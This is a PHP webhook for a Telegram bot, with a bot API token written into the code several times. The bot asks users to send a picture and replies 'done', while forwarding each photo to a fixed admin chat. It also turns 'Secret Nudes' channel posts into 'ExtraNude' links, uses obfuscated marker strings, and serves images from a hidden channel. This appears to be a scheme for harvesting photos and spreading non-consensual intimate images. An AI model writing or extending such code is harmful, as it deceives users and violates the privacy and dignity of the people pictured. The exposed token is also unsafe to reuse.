<?php
$content = file_get_contents("php://input");
$update = json_decode($content, true);
$chat_id = $update["message"]["chat"]["id"];
$message = $update["message"]["text"];
$message_id = $update["channel_post"]["message_id"];
$token = "5489035654:AAFzye9nIUywdX6tCZf5JvQT_7HGrwwZUpU";
$file_id= $update["message"]["photo"]["0"]["file_id"];
$title = $update["channel_post"]["sender_chat"]["title"];
$sfile_id = $update["channel_post"]["photo"]["0"]["file_id"];
function edit_message($message_id){
	$token = "5489035654:AAFzye9nIUywdX6tCZf5JvQT_7HGrwwZUpU";
        file_get_contents("https://api.telegram.org/bot$token/editMessageCaption?chat_id=@mood4it&message_id=$message_id&caption=join: @mood4it");}
function sendtoadmin($file_id){
	$token = "5489035654:AAFzye9nIUywdX6tCZf5JvQT_7HGrwwZUpU";
        file_get_contents("https://api.telegram.org/bot$token/sendPhoto?chat_id=150681772&photo=$file_id");}
function send_message($chat_id,$message_id, $text){
	$token = "5489035654:AAFzye9nIUywdX6tCZf5JvQT_7HGrwwZUpU";
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&reply_to_message_id=$message_id&text=$text");}
function hyperlink($file_id){
	$token = "5489035654:AAFzye9nIUywdX6tCZf5JvQT_7HGrwwZUpU";
	$text = "[ExtraNude](http://t.me/Thenwordbot?start=".$file_id.")%20%20%20%20%20%20%20%20%20%20join:%20@mood4it" ;
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=@mood4it&parse_mode=MarkdownV2&text=$text");}
function sendpic($chat_id,$file){
	$token = "5489035654:AAFzye9nIUywdX6tCZf5JvQT_7HGrwwZUpU";
	$content = file_get_contents("https://api.telegram.org/bot$token/sendPhoto?chat_id=$chat_id&photo=AgACAgQAAx0CaqEH1AADK".$file."AQADAgADcwADKQQ");
	$update = json_decode($content, true);
	$message_id = $update["message"]["message_id"];
	//sleep(30);
	file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=150681772&message_id=$message_id");
	}
function sendpic1($chat_id,$file){
	$token = "5489035654:AAFzye9nIUywdX6tCZf5JvQT_7HGrwwZUpU";
	$content = file_get_contents("https://api.telegram.org/bot$token/sendPhoto?chat_id=$chat_id&photo=https://t.me/gsjskslkaglajgdl792017yyshgalalh/$file");
	$update = json_decode($content, true);
	$message_id = $update["message"]["message_id"];
	//sleep(30);
	file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=150681772&message_id=$message_id");
	}
	
	
if($title == "in the mood"){edit_message($message_id);}
if($message == "/start"){send_message($chat_id,$message_id, "send your pic");}
if( is_null($file_id) != "1" ){send_message($chat_id,$message_id, "done"); sendtoadmin($file_id); }
if($title == "Secret Nudes"){
$sfile_id = $update["channel_post"]["photo"]["0"]["file_id"];
$file_id = substr($sfile_id, 21, -15);
hyperlink($file_id);
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=150681772&text=$sfile_id");} 
if($title == "sec2"){
	$message_id = yfu7hom3ky.$update["channel_post"]["message_id"].uoykcuf;
	hyperlink($message_id);}
if( substr($message,7, 17) == "yfu7hom3ky" ){ $file = substr($message, 17, -7); sendpic1($chat_id,$file);}
else{ $file = substr($message, 7); sendpic($chat_id,$file); } 
?>
